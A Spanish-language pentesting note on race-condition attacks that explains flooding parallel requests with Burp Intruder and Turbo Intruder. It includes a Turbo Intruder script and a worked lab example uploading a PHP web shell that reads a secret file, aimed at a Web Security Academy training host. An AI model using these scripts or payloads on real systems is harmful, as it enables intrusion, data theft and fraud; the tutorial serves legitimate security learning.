# RACE CONDITION

- [[#INTRODUCCION|INTRODUCCION]]
- [[#Cualquier cosa limitada por un número de intentos|Cualquier cosa limitada por un número de intentos]]
- [[#ATAQUE|ATAQUE]]
- [[#CUANDO PROBAR|CUANDO PROBAR]]
- [[#EJEMPLOS REALES|EJEMPLOS REALES]]
- [[#RACE CONDITION TOKEN OAUTH|RACE CONDITION TOKEN OAUTH]]


## INTRODUCCION

Este ataque consiste en enviar muchas peticiones en paralelo para ver si se ejecuta algo varias veces, por ejemplo realizar una transferencia de dinero, canjear un descuento y demas, si se envia una peticion se realizara la accion una vez pero puede ser que si se enviar unas 100 peticiones identicas en paralelo se ejecute unas 5 veces o mas o menos.

## Cualquier cosa limitada por un número de intentos

Este ataque se puede probar en una accion que **limitan el número de veces que puedes realizar una acción**. 

## ATAQUE

Necesitaremos burp para probar esto:

- Mandamos una peticion al intruder.
- definimos los valores del atawue intruder
- Cambiamos la cantidad de procesos a enviar, **options > Request Engine > Number of threads** en un valor como **999**.
-Le damos a atacar.

Si esta configurado correctamente, deberia realizarce la accion una vez pero si se realizo varias veces, veremos muchos con status 200 OK.

Ejemplo:

[https://pravinponnusamy.medium.com/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43](https://pravinponnusamy.medium.com/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)

-----------------------------------------------------

Otra forma de ataque es con la extension **turbo intruder** de burpsuite:

instalacion: Extender > bApp Store >Turbo intruder > Installing

una vez interceptada la peticion hacemos click derecho **Extensiones > Turbo Intruder > Enviar a Turbo Intruder**

podemos tomar esta base de script:

```python
def queueRequests(target, wordlists):
	engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,) 
	request1 = '''<YOUR-POST-REQUEST>'''
	request2 = '''<YOUR-GET-REQUEST>''' 
	
	# the 'gate' argument blocks the final byte of each request until openGate is invoked 
	
	engine.queue(request1, gate='race1') 
	
	for x in range(5): 
		engine.queue(request2, gate='race1') 
		
	# wait until every 'race1' tagged request is ready 
	# then send the final byte of each request 
	# (this method is non-blocking, just like queue) 
	engine.openGate('race1') 
	engine.complete(timeout=60) 
def handleResponse(req, interesting): 
	table.add(req)
```

ejemplo:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: ac931f261e641f2ec0d4480d00f10075.web-security-academy.net
Cookie: session=ooe5IIg2o4MNOsPw0zhhobgr2cp0ulMX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------289758322936814217033325707942
Content-Length: 534
Origin: https://ac931f261e641f2ec0d4480d00f10075.web-security-academy.net
Referer: https://ac931f261e641f2ec0d4480d00f10075.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

-----------------------------289758322936814217033325707942
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php
  system("cat /home/carlos/secret")
?>

-----------------------------289758322936814217033325707942
Content-Disposition: form-data; name="user"

wiener
-----------------------------289758322936814217033325707942
Content-Disposition: form-data; name="csrf"

9iZgZW5QqzkTQe03D8ySdVP7FYJYrkAU
-----------------------------289758322936814217033325707942--
'''

    request2 = '''
GET /files/avatars/exploit.php HTTP/1.1
Host: ac931f261e641f2ec0d4480d00f10075.web-security-academy.net
Cookie: session=ooe5IIg2o4MNOsPw0zhhobgr2cp0ulMX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

Si elige generar la `GET` solicitud manualmente, asegúrese de terminarla correctamente con una secuencia `\r\n\r\n` o un enter. Recuerde también que Python conservará cualquier espacio en blanco dentro de una cadena de varias líneas, por lo que debe ajustar la sangría en consecuencia para asegurarse de que se envíe una solicitud válida.

[https://www.hackingarticles.in/burp-suite-for-pentester-turbo-intruder/](https://www.hackingarticles.in/burp-suite-for-pentester-turbo-intruder/)

## CUANDO PROBAR

- Transferencias de dinero.
- Canjeo de cupon o descuento.
- Registro de usuarios
- La mayoría de las veces esto está directamente relacionado con **el dinero** (si se realiza una acción obtienes X dinero, así que intentemos hacerlo varias veces muy rápido).

## EJEMPLOS REALES

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)

## RACE CONDITION TOKEN OAUTH

- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-Conditions-exploring-the-possibilities.html)
- [https://book.hacktricks.xyz/pentesting-web/race-condition](https://book.hacktricks.xyz/pentesting-web/race-condition)